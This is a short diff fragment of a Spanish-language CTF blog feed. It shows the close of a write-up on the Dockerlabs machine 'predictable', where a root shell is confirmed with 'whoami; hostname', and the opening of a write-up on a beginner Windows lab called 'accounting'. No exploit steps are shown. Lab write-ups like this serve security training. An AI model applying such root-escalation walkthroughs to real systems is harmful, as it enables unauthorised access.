+mash@predictable:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y ejecutamos para obtener la shell como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@predictable:/opt# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
+</span>root
+predictable
+</code></pre></div></div>
+
+<p>Magnífica máquina de c4rta</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="muydificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="accounting" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>
 
 <p>Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
